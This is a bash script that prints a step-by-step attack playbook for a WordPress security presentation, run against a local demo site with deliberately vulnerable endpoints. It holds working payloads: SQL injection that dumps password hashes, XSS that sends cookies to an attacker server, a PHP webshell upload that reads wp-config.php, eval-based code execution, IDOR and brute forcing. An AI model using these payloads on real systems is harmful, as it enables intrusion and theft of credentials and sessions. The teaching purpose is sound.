#!/bin/bash
#
# WordPress Security Demo — Attack Playbook
# Run these commands step-by-step during the presentation
#
# Usage: Execute each section during the corresponding part of the talk
#        Run with --smoke-test to verify all endpoints before the talk
#

WP_URL="http://localhost:8080"
ATTACKER_URL="http://localhost:9090"
AJAX_URL="${WP_URL}/wp-admin/admin-ajax.php"

# ─────────────────────────────────────────────────
# PRE-FLIGHT SMOKE TEST
# ─────────────────────────────────────────────────

if [[ "$1" == "--smoke-test" ]]; then
    echo "============================================="
    echo "  Pre-Flight Smoke Test"
    echo "============================================="
    echo ""

    PASS=0
    FAIL=0

    check() {
        local label="$1"
        local url="$2"
        local expect="$3"
        local response
        response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$url" 2>/dev/null)
        if [[ "$response" == "$expect" ]]; then
            echo "  ✅ ${label} (HTTP ${response})"
            ((PASS++))
        else
            echo "  ❌ ${label} — expected ${expect}, got ${response}"
            ((FAIL++))
        fi
    }

    check_body() {
        local label="$1"
        local url="$2"
        local pattern="$3"
        local body
        body=$(curl -s --max-time 5 "$url" 2>/dev/null)
        if echo "$body" | grep -q "$pattern"; then
            echo "  ✅ ${label}"
            ((PASS++))
        else
            echo "  ❌ ${label} — pattern '${pattern}' not found"
            ((FAIL++))
        fi
    }

    echo "[WordPress]"
    check "WP Frontend" "${WP_URL}/" "200"
    check "WP Admin login" "${WP_URL}/wp-login.php" "200"
    echo ""

    echo "[Vulnerable Endpoints]"
    check_body "SQLi search"     "${AJAX_URL}?action=vuln_search&q=test" "query_executed"
    check      "XSS guestbook"  "${AJAX_URL}?action=vuln_guestbook_submit" "302"
    check      "CSRF email"     "${AJAX_URL}?action=vuln_change_email" "400"
    check_body "IDOR get_user"   "${AJAX_URL}?action=vuln_get_user&id=1" "login"
    check_body "File upload"     "${AJAX_URL}?action=vuln_upload" "No file uploaded"
    check_body "RCE calculator"  "${AJAX_URL}?action=vuln_calculator" "No expression"
    check_body "Enumeration"     "${AJAX_URL}?action=vuln_debug_info" "php_version"
    echo ""

    echo "[Fixed Endpoints]"
    check_body "SQLi fixed"      "${AJAX_URL}?action=vuln_search_fixed&q=test" "prepare"
    check_body "Upload fixed"    "${AJAX_URL}?action=vuln_upload_fixed" "No file uploaded"
    check_body "RCE fixed"       "${AJAX_URL}?action=vuln_calculator_fixed" "No expression"
    echo ""

    echo "[Attacker C2]"
    check "C2 index" "${ATTACKER_URL}/" "200"
    check "C2 loot"  "${ATTACKER_URL}/loot" "200"
    echo ""

    echo "[REST API]"
    check_body "Users endpoint" "${WP_URL}/wp-json/wp/v2/users" "slug"
    echo ""

    echo "============================================="
    echo "  Results: ${PASS} passed, ${FAIL} failed"
    echo "============================================="

    if [[ $FAIL -gt 0 ]]; then
        echo ""
        echo "  ⚠️  Fix failing checks before the talk!"
        exit 1
    else
        echo ""
        echo "  🎯 All systems go. Ready for the demo!"
        exit 0
    fi
fi

echo "============================================="
echo "  WordPress Security Demo - Attack Playbook"
echo "============================================="
echo ""
echo "Target: ${WP_URL}"
echo "Attacker C2: ${ATTACKER_URL}"
echo ""

# ─────────────────────────────────────────────────
# SECTION 1: ENUMERATION & FINGERPRINTING
# ─────────────────────────────────────────────────

echo "═══════════════════════════════════════"
echo "  1. ENUMERATION & FINGERPRINTING"
echo "═══════════════════════════════════════"

echo ""
echo "[1.1] Username enumeration via author archives:"
echo "  curl -s -I '${WP_URL}/?author=1' | grep -i location"
echo ""

echo "[1.2] Username enumeration via REST API:"
echo "  curl -s '${WP_URL}/wp-json/wp/v2/users' | python3 -m json.tool"
echo ""

echo "[1.3] WordPress version disclosure:"
echo "  curl -s '${WP_URL}' | grep 'generator'"
echo "  curl -s '${WP_URL}/readme.html' | head -20"
echo ""

echo "[1.4] Debug info endpoint (our vulnerable plugin):"
echo "  curl -s '${AJAX_URL}?action=vuln_debug_info' | python3 -m json.tool"
echo ""

echo "[1.5] Login error username disclosure:"
echo "  curl -s -d 'log=admin&pwd=wrongpassword' '${WP_URL}/wp-login.php' | grep -i 'error'"
echo ""

# ─────────────────────────────────────────────────
# SECTION 2: SQL INJECTION
# ─────────────────────────────────────────────────

echo "═══════════════════════════════════════"
echo "  2. SQL INJECTION"
echo "═══════════════════════════════════════"

echo ""
echo "[2.1] Normal search (legitimate use):"
echo "  curl -s '${AJAX_URL}?action=vuln_search&q=Welcome' | python3 -m json.tool"
echo ""

echo "[2.2] Boolean-based SQLi test:"
echo "  curl -s '${AJAX_URL}?action=vuln_search&q=1%27+OR+%271%27%3D%271' | python3 -m json.tool"
echo ""

echo "[2.3] UNION-based SQLi — Extract usernames and password hashes:"
echo "  curl -s '${AJAX_URL}?action=vuln_search&q=1%27+UNION+SELECT+user_login,user_pass,user_email+FROM+wp_users--+-' | python3 -m json.tool"
echo ""

echo "[2.4] FIXED version — same payload, no injection:"
echo "  curl -s '${AJAX_URL}?action=vuln_search_fixed&q=1%27+UNION+SELECT+user_login,user_pass,user_email+FROM+wp_users--+-' | python3 -m json.tool"
echo ""

# ─────────────────────────────────────────────────
# SECTION 3: CROSS-SITE SCRIPTING (XSS)
# ─────────────────────────────────────────────────

echo "═══════════════════════════════════════"
echo "  3. CROSS-SITE SCRIPTING (XSS)"
echo "═══════════════════════════════════════"

echo ""
echo "[3.1] Reflected XSS — script in URL:"
echo "  Open in browser: ${WP_URL}/?vuln_search_page=1&q=<script>alert('XSS')</script>"
echo ""

echo "[3.2] Stored XSS — inject into guestbook:"
echo "  curl -s -d 'action=vuln_guestbook_submit&name=Hacker&message=<script>fetch(\"${ATTACKER_URL}/steal?c=\"%2Bdocument.cookie)</script>' '${AJAX_URL}'"
echo ""

echo "[3.3] Stored XSS — img tag variant (bypasses some filters):"
echo "  curl -s -d 'action=vuln_guestbook_submit&name=Normal+User&message=<img+src=x+onerror=\"fetch(%27${ATTACKER_URL}/steal?c=%27%2Bdocument.cookie)\">' '${AJAX_URL}'"
echo ""

echo "[3.4] Check stolen cookies on attacker server:"
echo "  curl -s '${ATTACKER_URL}/loot' | python3 -m json.tool"
echo ""

# ─────────────────────────────────────────────────
# SECTION 4: CSRF
# ─────────────────────────────────────────────────

echo "═══════════════════════════════════════"
echo "  4. CSRF (Cross-Site Request Forgery)"
echo "═══════════════════════════════════════"

echo ""
echo "[4.1] CSRF attack — change admin email (requires admin session in browser):"
echo "  Open the file demos/csrf-attack.html in a browser while logged into WP"
echo ""

# ─────────────────────────────────────────────────
# SECTION 5: IDOR
# ─────────────────────────────────────────────────

echo "═══════════════════════════════════════"
echo "  5. IDOR (Insecure Direct Object Reference)"
echo "═══════════════════════════════════════"

echo ""
echo "[5.1] Enumerate all users (no auth required):"
echo "  for i in 1 2 3 4 5; do echo \"--- User \$i ---\"; curl -s \"${AJAX_URL}?action=vuln_get_user&id=\$i\" | python3 -m json.tool; done"
echo ""

echo "[5.2] Access draft/private posts:"
echo "  curl -s '${AJAX_URL}?action=vuln_get_post&id=1' | python3 -m json.tool"
echo "  curl -s '${AJAX_URL}?action=vuln_get_post&id=2' | python3 -m json.tool"
echo ""

# ─────────────────────────────────────────────────
# SECTION 6: FILE UPLOAD / WEBSHELL
# ─────────────────────────────────────────────────

echo "═══════════════════════════════════════"
echo "  6. UNRESTRICTED FILE UPLOAD"
echo "═══════════════════════════════════════"

echo ""
echo "[6.1] Create a PHP webshell:"
echo "  echo '<?php system(\$_GET[\"cmd\"]); ?>' > /tmp/shell.php"
echo ""

echo "[6.2] Upload the webshell:"
echo "  curl -s -F 'file=@/tmp/shell.php' '${AJAX_URL}?action=vuln_upload' | python3 -m json.tool"
echo ""

echo "[6.3] Execute commands via webshell:"
echo "  curl -s '${WP_URL}/wp-content/uploads/vuln-demo/shell.php?cmd=id'"
echo "  curl -s '${WP_URL}/wp-content/uploads/vuln-demo/shell.php?cmd=cat+/etc/passwd'"
echo "  curl -s '${WP_URL}/wp-content/uploads/vuln-demo/shell.php?cmd=cat+/var/www/html/wp-config.php'"
echo ""

# ─────────────────────────────────────────────────
# SECTION 7: REMOTE CODE EXECUTION
# ─────────────────────────────────────────────────

echo "═══════════════════════════════════════"
echo "  7. REMOTE CODE EXECUTION (eval)"
echo "═══════════════════════════════════════"

echo ""
echo "[7.1] Normal calculator use:"
echo "  curl -s -d 'action=vuln_calculator&expression=2%2B2' '${AJAX_URL}' | python3 -m json.tool"
echo ""

echo "[7.2] RCE — execute system command:"
echo "  curl -s -d 'action=vuln_calculator&expression=system(%27id%27)' '${AJAX_URL}' | python3 -m json.tool"
echo ""

echo "[7.3] RCE — read wp-config.php:"
echo "  curl -s -d 'action=vuln_calculator&expression=file_get_contents(%27/var/www/html/wp-config.php%27)' '${AJAX_URL}' | python3 -m json.tool"
echo ""

echo "[7.4] FIXED calculator — same payload blocked:"
echo "  curl -s -d 'action=vuln_calculator_fixed&expression=system(%27id%27)' '${AJAX_URL}' | python3 -m json.tool"
echo ""

# ─────────────────────────────────────────────────
# SECTION 8: WPSCAN
# ─────────────────────────────────────────────────

echo "═══════════════════════════════════════"
echo "  8. WPSCAN — Automated Scanning"
echo "═══════════════════════════════════════"

echo ""
echo "[8.1] Full scan with user and plugin enumeration:"
echo "  docker compose --profile tools run --rm wpscan --url http://wordpress --enumerate u,vp,vt --no-banner"
echo ""

echo "[8.2] Brute force with password list:"
echo "  docker compose --profile tools run --rm wpscan --url http://wordpress --passwords /tmp/passwords.txt --usernames admin,editor"
echo ""

echo "============================================="
echo "  End of Attack Playbook"
echo "============================================="
